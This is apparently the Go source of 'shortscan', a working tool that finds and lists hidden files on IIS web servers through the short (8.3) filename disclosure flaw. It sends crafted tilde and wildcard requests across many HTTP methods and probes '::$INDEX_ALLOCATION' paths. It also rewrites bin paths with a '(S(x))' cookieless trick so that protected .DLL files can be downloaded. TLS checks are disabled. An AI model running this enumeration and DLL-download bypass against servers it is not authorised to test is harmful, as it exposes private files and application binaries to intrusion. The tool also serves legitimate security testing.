package shortscan

import (
	"bufio"
	"crypto/tls"
	"embed"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"net/http/httputil"
	nurl "net/url"
	"os"
	"path"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/alexflint/go-arg"
	"github.com/fatih/color"
	"github.com/thezakman/shortscan/pkg/levenshtein"
	"github.com/thezakman/shortscan/pkg/maths"
	"github.com/thezakman/shortscan/pkg/shortutil"
	log "github.com/sirupsen/logrus"
)

// base types, stats and wordlist records

type baseRequest struct {
	url   string
	file  string
	tilde string
	ext   string
}

type httpStats struct {
	sync.Mutex
	bytesTx  int
	bytesRx  int
	requests int
	retries  int
}

type markers struct {
	statusPos int
	statusNeg int
}

type distances struct {
	distance float32
	body     string
}

type wordlistRecord struct {
	checksums   string
	filename    string
	extension   string
	filename83  string
	extension83 string
}

type wordlistConfig struct {
	wordlist  []wordlistRecord
	isRainbow bool
	sync.Mutex
}

type attackConfig struct {
	method            string
	suffix            string
	tildes            []string
	fileChars         map[string]string
	extChars          map[string]string
	foundFiles        map[string]struct{}
	foundDirectories  map[string]struct{}
	wordlist          wordlistConfig
	distanceMutex     sync.Mutex
	autocompleteMutex sync.Mutex
}

type resultOutput struct {
	Type      string `json:"type"`
	FullMatch bool   `json:"fullmatch"`
	BaseUrl   string `json:"baseurl"`
	File      string `json:"shortfile"`
	Ext       string `json:"shortext"`
	Tilde     string `json:"shorttilde"`
	Partname  string `json:"partname"`
	Fullname  string `json:"fullname"`
}

type statusOutput struct {
	Type       string `json:"type"`
	Url        string `json:"url"`
	Server     string `json:"server"`
	Vulnerable bool   `json:"vulnerable"`
}

type statsOutput struct {
	Type          string `json:"type"`
	Requests      int    `json:"requests"`
	Retries       int    `json:"retries"`
	SentBytes     int    `json:"sentbytes"`
	ReceivedBytes int    `json:"receivedbytes"`
}

// Version, rainbow table magic, default character set
const version = "0.9.4"
const rainbowMagic = "#SHORTSCAN#"
const alphanum = "JFKGOTMYVHSPCANDXLRWEBQUIZ8549176320"

// Standard headers + IIS DEBUG, ordered roughly by frequency and probable response time
// https://www.iana.org/assignments/http-methods/http-methods.xhtml#methods
var httpMethods = [...]string{
	"OPTIONS", "HEAD", "TRACE", "DEBUG", "GET", "POST", "PUT", "PATCH", "DELETE", "ACL",
	"BASELINE-CONTROL", "BIND", "CHECKIN", "CHECKOUT", "CONNECT", "COPY", "LABEL", "LINK",
	"LOCK", "MERGE", "MKACTIVITY", "MKCALENDAR", "MKCOL", "MKREDIRECTREF", "MKWORKSPACE",
	"MOVE", "ORDERPATCH", "PRI", "PROPFIND", "PROPPATCH", "REBIND", "REPORT", "SEARCH",
	"UNBIND", "UNCHECKOUT", "UNLINK", "UNLOCK", "UPDATE", "UPDATEREDIRECTREF", "VERSION-CONTROL",
}

// Path suffixes to try
var pathSuffixes = [...]string{"/", "", "/.aspx", "?aspxerrorpath=/", "/.aspx?aspxerrorpath=/", "/.asmx", "/.vb"}

// Embed the default wordlist
//
//go:embed resources/wordlist.txt
var defaultWordlist embed.FS

// Caches and regexes
var statusCache map[string]map[int]struct{}
var distanceCache map[string]map[int]distances
var checksumRegex *regexp.Regexp

// Command-line arguments and help
type arguments struct {
	Urls              []string `arg:"positional" help:"url to scan (multiple URLs can be specified)" placeholder:"URL"`
	List              string   `arg:"--list,-l" help:"file containing list of URLs to scan" placeholder:"FILE"`
	Wordlist          string   `arg:"-w" help:"combined wordlist + rainbow table generated with shortutil" placeholder:"FILE"`
	Headers           []string `arg:"--header,-H,separate" help:"header to send with each request (use multiple times for multiple headers)"`
	Concurrency       int      `arg:"-c" help:"number of requests to make at once" default:"20"`
	Timeout           int      `arg:"-t" help:"per-request timeout in seconds" placeholder:"SECONDS" default:"10"`
	Output            string   `arg:"-o" help:"output format (human = human readable; json = JSON)" placeholder:"format" default:"human"`
	Verbosity         int      `arg:"-v" help:"how much noise to make (0 = quiet; 1 = debug; 2 = trace)" default:"0"`
	FullUrl           bool     `arg:"-F" help:"display the full URL for confirmed files rather than just the filename" default:"false"`
	NoRecurse         bool     `arg:"-n" help:"don't detect and recurse into subdirectories (disabled when autocomplete is disabled)" default:"false"`
	Stabilise         bool     `arg:"-s" help:"attempt to get coherent autocomplete results from an unstable server (generates more requests)" default:"false"`
	Patience          int      `arg:"-p" help:"patience level when determining vulnerability (0 = patient; 1 = very patient)" placeholder:"LEVEL" default:"0"`
	Characters        string   `arg:"-C" help:"filename characters to enumerate" default:"JFKGOTMYVHSPCANDXLRWEBQUIZ8549176320-_()&'!#$%@^{}~"`
	Autocomplete      string   `arg:"-a" help:"autocomplete detection mode (auto = autoselect; method = HTTP method magic; status = HTTP status; distance = Levenshtein distance; none = disable)" placeholder:"mode" default:"auto"`
	IsVuln            bool     `arg:"-V" help:"bail after determining whether the service is vulnerable" default:"false"`
	Index             bool     `arg:"-i" help:"test ::$INDEX_ALLOCATION and :$i30:$INDEX_ALLOCATION"`
	BackwardsRecurse  bool     `arg:"--backwards-recurse,-r" help:"perform regressive scanning on parent directories" default:"false"`
}

func (arguments) Version() string {
	return getBanner()
}

var args arguments

// getBanner returns the main banner
func getBanner() string {
	return color.New(color.FgBlue, color.Bold).Sprint("🌀 Shortscan v" + version) +
		" · " + color.New(color.FgWhite, color.Bold).Sprint("an IIS short filename enumeration tool by bitquark & TheZakMan")
}

// pathEscape returns an escaped URL with spaces encoded as %20 rather than + (which can cause odd behaviour from IIS in some modes)
func pathEscape(url string) string {
	return strings.Replace(nurl.QueryEscape(url), "+", "%20", -1)
}

// replaceBinALLOCATION replaces bin::$INDEX_ALLOCATION with a valid path to download .DLL
func replaceBinALLOCATION(url string) string {
	u, _ := nurl.Parse(url)
	segments := strings.Split(strings.Trim(u.Path, "/"), "/")
	lastSegment := segments[len(segments)-1]

	if lastSegment == "bin::$INDEX_ALLOCATION" {
		newPath := strings.Join(segments[:len(segments)-1], "/")
		if newPath == "" {
			newPath = "(S(x))/b/(S(x))in/"
		} else {
			newPath += "/(S(x))/b/(S(x))in/"
		}
		url = u.Scheme + "://" + u.Host + "/" + newPath
	}
	return url
}

// fetch requests the given URL and returns an HTTP response object, handling retries gracefully
func fetch(hc *http.Client, st *httpStats, method string, url string) (*http.Response, error) {

	// Create a request object
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		log.WithFields(log.Fields{"err": err}).Fatal("Unable to create request object")
	}

	// Default user agent
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/1337.00 (KHTML, like Gecko) Chrome/1337.0.0.0 Safari/1337.00")

	// Loop through custom headers
	for _, h := range args.Headers {
		hs := strings.SplitN(h, ":", 2)
		if len(hs) != 2 {
			log.WithFields(log.Fields{"header": h}).Fatal("Invalid header")
		}
		h, v := strings.Trim(hs[0], " "), strings.Trim(hs[1], " ")
		if strings.ToLower(h) == "host" {
			req.Host = v
		} else {
			req.Header.Add(h, v)
		}
	}

	// Request loop
	var t int
	var rerr error
	var res *http.Response
	for t = 0; t < 4; t++ {
		res, rerr = hc.Do(req)
		if err == nil {
			break
		}
		d := time.Duration(t*2) * time.Second
		log.WithFields(log.Fields{"err": rerr}).Trace(fmt.Sprintf("fetch() failed, retrying in %s", d))
		time.Sleep(d)
	}

	if res == nil {
		return nil, rerr
	}

	log.WithFields(log.Fields{"method": method, "url": url, "status": res.StatusCode}).Trace("fetch()")

	// Update request stats
	st.Lock()
	st.requests++
	st.retries += t
	if r, err := httputil.DumpRequestOut(req, true); err == nil {
		st.bytesTx += len(r)
	} else {
		log.WithFields(log.Fields{"err": err}).Fatal("Error dumping request")
	}
	if r, err := httputil.DumpResponse(res, true); err == nil {
		st.bytesRx += len(r)
	} else {
		log.WithFields(log.Fields{"err": err}).Fatal("Error dumping response")
	}
	st.Unlock()

	// Close the response body to allow connection reuse
	res.Body.Close()

	return res, nil
}

// enumerate builds and fetches candidate short name URLs using recursion
func enumerate(sem chan struct{}, wg *sync.WaitGroup, hc *http.Client, st *httpStats, ac *attackConfig, mk markers, br baseRequest) {

	// Determine if in extension enumeration mode
	extMode := len(br.ext) > 0

	// Select the character map to use
	var chars string
	if extMode {
		chars = ac.extChars[br.tilde]
	} else {
		chars = ac.fileChars[br.tilde]
	}

	// Loop through characters
	for _, char := range chars {
		wg.Add(1)
		go func(sem chan struct{}, wg *sync.WaitGroup, hc *http.Client, ac *attackConfig, mk markers, br baseRequest, char string) {
			sem <- struct{}{}
			defer func() {
				<-sem
				wg.Done()
			}()

			// Workaround for an IIS bug with "%" followed by two hex digits
			if char == "%" {
				var x, y int
				if extMode {
					x, y = len(br.ext), 1
				} else {
					x, y = len(br.file), 4
				}
				for i := 0; i < 2 && x < y; i++ {
					char += "?"
				}
			}

			// Append the next character and build the candidate URL
			var url string
			if extMode {
				br.ext += char
				url = br.url + pathEscape(br.file) + br.tilde + pathEscape(br.ext) + "*" + ac.suffix
			} else {
				br.file += char
				url = br.url + pathEscape(br.file) + "*" + br.tilde + "*" + pathEscape(br.ext) + ac.suffix
			}

			// Check if this looks like a hit
			res, err := fetch(hc, st, ac.method, url)
			if err == nil && res.StatusCode == mk.statusPos {
				// Check if the full file part is reached
				res, err := fetch(hc, st, ac.method, br.url+pathEscape(br.file)+br.tilde+"*"+pathEscape(br.ext)+ac.suffix)
				if err == nil && res.StatusCode == mk.statusPos {
					res, err := fetch(hc, st, ac.method, br.url+pathEscape(br.file)+br.tilde+pathEscape(br.ext)+ac.suffix)
					if err == nil && res.StatusCode != mk.statusNeg {
						var fnr, method string
						if args.Autocomplete != "none" {
							var fnc []wordlistRecord
							if cm := ac.wordlist.isRainbow && checksumRegex.MatchString(br.file); cm {
								fnc = autodechecksum(ac, br)
							}
							fnc = append(fnc, autocomplete(ac, br)...)
							if args.Autocomplete == "method" {
								method = "_"
							} else {
								method = "GET"
							}
							for _, c := range fnc {
								func() {
									ac.autocompleteMutex.Lock()
									defer ac.autocompleteMutex.Unlock()
									candidatePath := pathEscape(c.filename + c.extension)
									if _, ok := ac.foundFiles[candidatePath]; ok {
										return
									}
									if strings.ToLower(br.ext) == ".dll" {
										br.url = replaceBinALLOCATION(br.url)
									}
									res, err := fetch(hc, st, method, br.url+candidatePath)
									if err != nil {
										log.WithFields(log.Fields{"err": err, "method": method, "url": br.url + candidatePath}).Info("Existence check error")
										return
									}
									if args.Autocomplete == "method" {
										if res.StatusCode == 405 {
											fnr = candidatePath
										}
									} else if args.Autocomplete == "status" {
										ss := getStatuses(c, br, hc, st)
										if _, e := ss[res.StatusCode]; !e {
											fnr = candidatePath
										}
									} else if args.Autocomplete == "distance" {
										dists := getDistances(c, br, hc, st, ac)
										if dists[res.StatusCode] == (distances{}) {
											log.WithFields(log.Fields{"url": br.url + candidatePath, "status": res.StatusCode}).Info("Autocomplete got a status code hit")
											fnr = candidatePath
										} else {
											b := make([]byte, 1024)
											res.Body.Read(b)
											body, sbody := string(b), dists[res.StatusCode].body
											lp := float32(levenshtein.Distance(sbody, body)) / float32(maths.Max(len(sbody), len(body)))
											if d := lp - dists[res.StatusCode].distance; d > 0.1 {
												log.WithFields(log.Fields{"url": br.url + candidatePath, "distance": lp, "delta": d}).Info("Autocomplete got a distance hit")
												fnr = candidatePath
											}
										}
									} else {
										log.Fatal("What are you doing here?")
									}
									if fnr != "" {
										ac.foundFiles[fnr] = struct{}{}
										if !args.NoRecurse {
											res, err := fetch(hc, st, "HEAD", br.url+fnr)
											if err != nil {
												log.WithFields(log.Fields{"err": err, "method": "HEAD", "url": br.url + fnr}).Info("Directory recursion check error")
											} else {
												if loc := res.Header.Get("Location"); strings.HasSuffix(strings.ToLower(loc), "/"+strings.ToLower(fnr)+"/") {
													ac.foundDirectories[fnr] = struct{}{}
												}
											}
										}
									}
								}()
								if fnr != "" {
									break
								}
							}
						}
						fn, fe := br.file, br.ext
						if len(fn) >= 6 {
							fn = fn + "?"
						}
						if len(fe) >= 4 {
							fe = fe + "?"
						}
						if args.Output == "human" {
							var fp, ff string
							if fnr != "" {
								fp = color.HiBlackString(fn + fe)
								if args.FullUrl {
									ff = color.GreenString(br.url) + color.HiGreenString(pathEscape(strings.ToLower(fnr)))
								} else {
									ff = color.HiGreenString(fnr)
								}
							} else {
								if len(br.file) < 6 {
									fn = color.GreenString(fn)
								}
								if len(br.ext) < 4 {
									fe = color.GreenString(fe)
								}
								fp = strings.Replace(fn+fe, "?", color.HiBlackString("?"), -1)
							}
							printHuman(fmt.Sprintf("%-20s %-28s %s", br.file+br.tilde+br.ext, fp, ff))
						} else {
							o := resultOutput{
								Type:      "result",
								FullMatch: fnr != "",
								BaseUrl:   br.url,
								File:      br.file,
								Tilde:     br.tilde,
								Ext:       br.ext,
								Partname:  fn + fe,
								Fullname:  fnr,
							}
							printJSON(o)
						}
					} else if err == nil && len(br.ext) > 0 {
						log.WithFields(log.Fields{"status": res.StatusCode, "statusNeg": mk.statusNeg, "filename": br.file + br.tilde + br.ext + ac.suffix}).
							Debug("Possible hit, but status is the same as a negative match")
					}
					if len(br.ext) == 0 {
						nr := br
						nr.ext = "."
						enumerate(sem, wg, hc, st, ac, mk, nr)
					}
				}
				if (extMode && len(br.ext) < 4) || (!extMode && len(br.file) < 6) {
					var url string
					if extMode {
						url = br.url + pathEscape(br.file) + br.tilde + pathEscape(br.ext) + "%3f*" + ac.suffix
					} else {
						url = br.url + pathEscape(br.file) + "%3f*" + br.tilde + "*" + pathEscape(br.ext) + ac.suffix
					}
					res, err = fetch(hc, st, ac.method, url)
					if err == nil && res.StatusCode != mk.statusNeg {
						enumerate(sem, wg, hc, st, ac, mk, br)
					}
				}
			}
		}(sem, wg, hc, ac, mk, br, string(char))
	}
}

// testIndexAllocations tests special paths such as ::$INDEX_ALLOCATION
func testIndexAllocations(urls []string, hc *http.Client, st *httpStats, wc wordlistConfig, mk markers) {
	paths := []string{"::$INDEX_ALLOCATION"}
	for _, url := range urls {
		for _, p := range paths {
			modifiedURL := url + p
			Scan([]string{modifiedURL}, hc, st, wc, mk, make(map[string]struct{}))
		}
	}
}

// autocomplete returns a list of possible full filenames for a given tilde filename
func autocomplete(ac *attackConfig, br baseRequest) []wordlistRecord {
	fs := make(map[string]wordlistRecord)
	ch := make(chan wordlistRecord, 1024)
	go getWordlist(ch, ac)
	for record := range ch {
		if br.file == record.filename83 && br.ext[maths.Min(len(br.ext), 1):] == record.extension83 {
			fs[record.filename+record.extension] = record
		}
	}
	f := make([]wordlistRecord, 0, len(fs))
	for _, v := range fs {
		f = append(f, v)
	}
	if len(f) > 0 {
		log.WithFields(log.Fields{"file": br.file, "ext": br.ext, "count": len(f)}).Info("Autocomplete found candidates")
		log.WithFields(log.Fields{"candidates": f}).Trace("Autocomplete candidates")
	}
	return f
}

// autodechecksum attempts to reconstruct Windows checksummed filenames (e.g. A5FAB~1.HTM)
func autodechecksum(ac *attackConfig, br baseRequest) []wordlistRecord {
	l := 2 - (6 - len(br.file))
	prefix, checksum := br.file[:l], br.file[l:]
	log.WithFields(log.Fields{"file": br.file, "prefix": prefix, "checksum": checksum}).Info("Possible checksummed alias")
	fs := make(map[string]wordlistRecord)
	ch := make(chan wordlistRecord, 1024)
	go getWordlist(ch, ac)
	for record := range ch {
		for i := 0; i < len(record.checksums); i += 4 {
			c := record.checksums[i : i+4]
			if c == checksum && strings.HasPrefix(strings.ToUpper(record.filename), prefix) && strings.HasPrefix(strings.ToUpper(record.extension), br.ext) {
				fs[record.filename+record.extension] = record
			}
		}
	}
	f := make([]wordlistRecord, 0, len(fs))
	for _, v := range fs {
		f = append(f, v)
	}
	if len(f) > 1 {
		log.WithFields(log.Fields{"file": br.file, "ext": br.ext, "count": len(f)}).Info("Dechecksum found candidates")
		log.WithFields(log.Fields{"candidates": f}).Trace("Dechecksum candidates")
	}
	return f
}

// getStatuses fetches non-existent URLs and returns a set of response statuses
func getStatuses(c wordlistRecord, br baseRequest, hc *http.Client, st *httpStats) map[int]struct{} {
	if len(statusCache[c.extension]) > 0 {
		return statusCache[c.extension]
	}
	l := 2
	if args.Stabilise {
		l = 12
	}
	statuses := make(map[int]struct{}, l)
	for i := 0; i < l; i++ {
		p := randPath(rand.Intn(4)+8, 0, alphanum) + c.extension
		if res, err := fetch(hc, st, "GET", br.url+p); err == nil {
			statuses[res.StatusCode] = struct{}{}
		}
	}
	log.WithFields(log.Fields{"extension": c.extension, "statuses": statuses}).Info("Got non-existent file statuses")
	statusCache[c.extension] = statuses
	return statuses
}

// getDistances calculates response distances using Levenshtein
func getDistances(c wordlistRecord, br baseRequest, hc *http.Client, st *httpStats, ac *attackConfig) map[int]distances {
	ac.distanceMutex.Lock()
	defer ac.distanceMutex.Unlock()
	if len(distanceCache[c.extension]) > 0 {
		return distanceCache[c.extension]
	}
	log.WithFields(log.Fields{"url": br.url, "extension": c.extension}).Info("Sampling responses for Levenshtein distance calculation")
	l := 4
	if args.Stabilise {
		l = 24
	}
	bodies := make(map[int][]string, l)
	highdist := make(map[int]float32, l)
	dists := make(map[int]distances)
	var p string
	for i := 0; i < l; i++ {
		p = randPath(rand.Intn(4)+8, 0, alphanum) + c.extension
		if res, err := fetch(hc, st, "GET", br.url+p); err == nil {
			b := make([]byte, 1024)
			res.Body.Read(b)
			body := string(b)
			for j := 0; j < len(bodies[res.StatusCode])-1; j++ {
				ld := levenshtein.Distance(bodies[res.StatusCode][j], body)
				lp := float32(ld) / float32(maths.Max(len(bodies[res.StatusCode][j]), len(body)))
				if dists[res.StatusCode] == (distances{}) || lp > highdist[res.StatusCode] {
					dists[res.StatusCode] = distances{lp, body}
					highdist[res.StatusCode] = lp
				}
			}
			bodies[res.StatusCode] = append(bodies[res.StatusCode], body)
		}
	}
	for s, d := range dists {
		log.WithFields(log.Fields{"extension": c.extension, "status": s, "distance": d.distance}).Info("Calculated Levenshtein distance")
	}
	distanceCache[c.extension] = dists
	return dists
}

// getWordlist returns wordlist entries
func getWordlist(ch chan wordlistRecord, ac *attackConfig) {
	ac.wordlist.Lock()
	for _, record := range ac.wordlist.wordlist {
		ch <- record
	}
	ac.wordlist.Unlock()
	close(ch)
}

// randPath returns a random path built with the provided characters
func randPath(l int, d int, chars string) string {
	c := len(chars)
	b := make([]byte, l)
	for i := range b {
		b[i] = chars[rand.Intn(c)]
	}
	for i := 0; i < d; i++ {
		b[rand.Intn(l)] = '.'
	}
	return pathEscape(string(b))
}

// printHuman prints human-readable output if enabled
func printHuman(s ...any) {
	if args.Output == "human" {
		fmt.Println(s...)
	}
}

// printJSON prints JSON formatted output if enabled
func printJSON(o any) {
	if args.Output == "json" {
		j, _ := json.Marshal(o)
		fmt.Println(string(j))
	}
}

// Scan starts enumeration of the given URLs.
// A shared "visited" map is passed so that no URL is processed more than once.
func Scan(urls []string, hc *http.Client, st *httpStats, wc wordlistConfig, mk markers, visited map[string]struct{}) {
	// Main loop while there are URLs in the queue
	for len(urls) > 0 {
		var url string
		url, urls = urls[0], urls[1:]
		url = strings.TrimSuffix(url, "/") + "/"

		// Skip if URL has already been visited
		if _, ok := visited[url]; ok {
			continue
		}
		visited[url] = struct{}{}

		// Default to HTTPS if no protocol is provided
		if !strings.Contains(url, "://") {
			url = "https://" + url
		}

		// Pre-flight: validate URL and check accessibility
		if _, err := nurl.Parse(url); err != nil {
			log.WithFields(log.Fields{"url": url, "error": err}).Fatal("Unable to parse URL")
		}
		res, err := fetch(hc, st, "GET", url+".aspx")
		if err != nil {
			log.WithFields(log.Fields{"error": err}).Fatal("Unable to access server")
		}

		printHuman("\n════════════════════════════════════════════════════════════════════════════════")
		printHuman(color.New(color.FgWhite, color.Bold).Sprint("URL")+":", url)
		srv := "<unknown>"
		if len(res.Header["Server"]) > 0 {
			srv = strings.Join(res.Header["Server"], ", ")
		}
		if v, ok := res.Header["X-Aspnet-Version"]; ok {
			srv += " (ASP.NET v" + v[0] + ")"
		}
		if args.Output == "human" && srv != "<unknown>" && !strings.Contains(srv, "IIS") && !strings.Contains(srv, "ASP") {
			srv += " " + color.HiRedString("[!]")
		}
		printHuman(color.New(color.FgWhite, color.Bold).Sprint("Running")+":", srv)

		// Set up autocomplete mode
		if args.Autocomplete == "auto" {
			if res, err := fetch(hc, st, "_", url); err == nil && res.StatusCode == 405 {
				args.Autocomplete = "method"
				log.Info("Using method-based file existence checks")
			} else {
				args.Autocomplete = "status"
				log.Info("Using status-based file existence checks")
			}
		}

		// First stage: check if the server is vulnerable
		ac := attackConfig{wordlist: wc}
		var pc, mc int
		if args.Patience == 1 {
			pc = len(pathSuffixes)
			mc = len(httpMethods)
		} else {
			pc = 4
			mc = 9
		}
	outerEscape:
		for _, suffix := range pathSuffixes[:pc] {
			methodEscape:
			for _, method := range httpMethods[:mc] {
				var statusNeg int
				validMarkers := struct{ status bool }{true}
				for i := 0; i < 4; i++ {
					res, err := fetch(hc, st, method, fmt.Sprintf("%s*%d*%s", url, rand.Intn(5)+5, suffix))
					if err != nil {
						log.Debug("Method " + method + " failed, skipping")
						continue methodEscape
					}
					status := res.StatusCode
					if statusNeg != 0 && status != statusNeg {
						log.WithFields(log.Fields{"status": status, "statusNeg": statusNeg}).Debug("Method " + method + " unstable, skipping")
						continue methodEscape
					}
					statusNeg = status
				}
				if validMarkers.status {
					for i := 1; i <= 4; i++ {
						res, err := fetch(hc, st, method, fmt.Sprintf("%s*~%d*%s", url, i, suffix))
						if err == nil {
							statusPos := res.StatusCode
							if validMarkers.status && statusPos != statusNeg {
								res, _ := fetch(hc, st, method, fmt.Sprintf("%s*~0*%s", url, suffix))
								if statusPos == res.StatusCode {
									log.WithFields(log.Fields{"statusPos": statusPos, "statusNeg": statusNeg}).Debug("Negative response differed, could be rate limiting or server instability")
								} else {
									ac.tildes = append(ac.tildes, fmt.Sprintf("~%d", i))
									mk.statusPos = statusPos
									mk.statusNeg = statusNeg
								}
							}
						}
					}
					if len(ac.tildes) > 0 {
						ac.method = method
						ac.suffix = suffix
						break outerEscape
					}
				}
			}
		}

		printJSON(statusOutput{Type: "status", Url: url, Server: srv, Vulnerable: len(ac.tildes) > 0})
		if len(ac.tildes) == 0 {
			printHuman(color.New(color.FgWhite, color.Bold).Sprint("Vulnerable:"), color.HiBlueString("No"), "(or no 8.3 files exist)")
			printHuman("════════════════════════════════════════════════════════════════════════════════")
			continue
		}

		printHuman(color.New(color.FgWhite, color.Bold).Sprint("Vulnerable:"), color.HiRedString("Yes!"))
		printHuman("════════════════════════════════════════════════════════════════════════════════")
		log.WithFields(log.Fields{"method": ac.method, "suffix": ac.suffix, "statusPos": mk.statusPos, "statusNeg": mk.statusNeg}).Info("Found working options")
		log.WithFields(log.Fields{"tildes": ac.tildes}).Info("Found tilde files")
		if args.IsVuln {
			continue
		}

		// Second stage: determine which characters are in use
		ac.fileChars, ac.extChars = make(map[string]string), make(map[string]string)
		for i := 0; i < 2; i++ {
			for _, char := range args.Characters {
				for _, tilde := range ac.tildes {
					var cu string
					var cm map[string]string
					if i == 0 {
						cm = ac.fileChars
						cu = url + "*" + pathEscape(string(char)) + "*" + tilde + "*" + ac.suffix
					} else {
						cm = ac.extChars
						cu = url + "*" + tilde + "*" + pathEscape(string(char)) + "*" + ac.suffix
					}
					res, err := fetch(hc, st, ac.method, cu)
					if err == nil && res.StatusCode != mk.statusNeg {
						cm[tilde] = cm[tilde] + string(char)
					}
				}
			}
		}
		log.WithFields(log.Fields{"fileChars": ac.fileChars, "extChars": ac.extChars}).Info("Built character set")

		// Third stage: full enumeration
		ac.foundFiles = make(map[string]struct{})
		ac.foundDirectories = make(map[string]struct{})
		sem := make(chan struct{}, args.Concurrency)
		wg := new(sync.WaitGroup)
		for _, tilde := range ac.tildes {
			enumerate(sem, wg, hc, st, &ac, mk, baseRequest{url: url, file: "", tilde: tilde, ext: ""})
		}
		wg.Wait()

		// Prepend discovered directories for further processing
		for dir := range ac.foundDirectories {
			urls = append([]string{url + dir + "/"}, urls...)
		}

		// Regressive (backwards) scan: if the flag is set, compute the parent URL and add it if not already visited.
		if args.BackwardsRecurse {
			parsed, err := nurl.Parse(url)
			if err != nil {
				log.WithFields(log.Fields{"url": url, "error": err}).Error("Failed to parse URL for backwards scanning")
			} else {
				currentPath := strings.TrimSuffix(parsed.Path, "/")
				if currentPath == "" {
					currentPath = "/"
				}
				parentPath := path.Dir(currentPath)
				if parentPath == "." || parentPath == "" {
					parentPath = "/"
				}
				if parentPath != currentPath {
					parsed.Path = parentPath
					newURL := parsed.Scheme + "://" + parsed.Host + parsed.Path
					if !strings.HasSuffix(newURL, "/") {
						newURL += "/"
					}
					// Only add the parent URL if it hasn't been visited
					if _, exists := visited[newURL]; !exists {
						urls = append(urls, newURL)
						printHuman("Added regressive scan URL: ", newURL)
					}
				}
			}
		}

		printHuman("════════════════════════════════════════════════════════════════════════════════")
	}
	printHuman()
	printHuman(fmt.Sprintf("%s Requests: %d; Retries: %d; Sent %d bytes; Received %d bytes",
		color.New(color.FgWhite, color.Bold).Sprint("Finished!"), st.requests, st.retries, st.bytesTx, st.bytesRx))
	printJSON(statsOutput{Type: "statistics", Requests: st.requests, Retries: st.retries, SentBytes: st.bytesTx, ReceivedBytes: st.bytesRx})
}

// Run kicks off scans from the command line
func Run() {
	rand.Seed(time.Now().UTC().UnixNano())
	p := arg.MustParse(&args)
	args.Autocomplete = strings.ToLower(args.Autocomplete)
	if args.Autocomplete != "auto" && args.Autocomplete != "method" && args.Autocomplete != "status" && args.Autocomplete != "distance" && args.Autocomplete != "none" {
		p.Fail("autocomplete must be one of: auto, status, method, none")
	}
	args.Output = strings.ToLower(args.Output)
	if args.Output != "human" && args.Output != "json" {
		p.Fail("output must be one of: human, json")
	}

	printHuman(getBanner())

	// Warn if any filename characters are invalid
	for _, c := range []string{"<", ">", ":", "\"", "/", "\\", "|", "?", "*"} {
		if strings.Contains(args.Characters, c) {
			log.WithFields(log.Fields{"character": c}).Warn("Invalid filename character; weird things may happen")
		}
	}

	log.SetFormatter(&log.TextFormatter{
		DisableLevelTruncation: true,
		DisableTimestamp:       true,
	})
	if args.Verbosity > 1 {
		log.SetLevel(log.TraceLevel)
	} else if args.Verbosity > 0 {
		log.SetLevel(log.DebugLevel)
	} else {
		log.SetLevel(log.WarnLevel)
	}

	hc := &http.Client{
		Timeout: time.Duration(args.Timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true, Renegotiation: tls.RenegotiateOnceAsClient},
			Proxy:           http.ProxyFromEnvironment,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}

	mk := markers{}
	st := &httpStats{}
	wc := wordlistConfig{}
	statusCache = make(map[string]map[int]struct{})
	distanceCache = make(map[string]map[int]distances)
	checksumRegex = regexp.MustCompile(".{1,2}[0-9A-F]{4}")

	var s *bufio.Scanner
	if args.Wordlist != "" {
		log.WithFields(log.Fields{"file": args.Wordlist}).Info("Using custom wordlist")
		fh, err := os.Open(args.Wordlist)
		if err != nil {
			log.WithFields(log.Fields{"err": err}).Fatal("Unable to open wordlist")
		}
		s = bufio.NewScanner(fh)
	} else {
		log.Info("Using built-in wordlist")
		fh, _ := defaultWordlist.Open("resources/wordlist.txt")
		s = bufio.NewScanner(fh)
	}

	n := 0
	for s.Scan() {
		line := s.Text()
		if n == 0 && line == rainbowMagic {
			wc.isRainbow = true
			log.Info("Rainbow table provided, enabling auto dechecksumming")
			continue
		}
		if l := len(line); l == 0 || line[0] == '#' {
			continue
		}
		if wc.isRainbow {
			if strings.Count(line, "\t") != 4 {
				log.WithFields(log.Fields{"line": line}).Fatal("Wordlist entry invalid (incorrect tab count)")
			}
			c := strings.Split(line, "\t")
			f, e, f83, e83 := c[3], c[4], c[1], c[2]
			if len(e) > 0 {
				e = "." + e
			}
			wc.wordlist = append(wc.wordlist, wordlistRecord{c[0], f, e, f83, e83})
		} else {
			var r wordlistRecord
			if p := strings.LastIndex(line, "."); p > 0 && line[0] != '.' {
				f, e := line[:p], line[p:]
				_, f83, e83 := shortutil.Gen8dot3(f, e)
				r = wordlistRecord{"", f, e, f83, e83}
			} else {
				_, f83, _ := shortutil.Gen8dot3(line, "")
				r = wordlistRecord{"", line, "", f83, ""}
			}
			wc.wordlist = append(wc.wordlist, r)
		}
		n++
	}

	if args.List != "" {
		f, err := os.Open(args.List)
		if err != nil {
			log.WithFields(log.Fields{"err": err}).Fatal("Unable to open URL list file")
		}
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			args.Urls = append(args.Urls, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			log.WithFields(log.Fields{"err": err}).Fatal("Error reading URL list file")
		}
	}

	if args.Index && len(args.Urls) > 0 {
		testIndexAllocations(args.Urls, hc, st, wc, mk)
		return
	}

	// Create a global visited map so that paths are not re-scanned
	visited := make(map[string]struct{})
	Scan(args.Urls, hc, st, wc, mk, visited)
}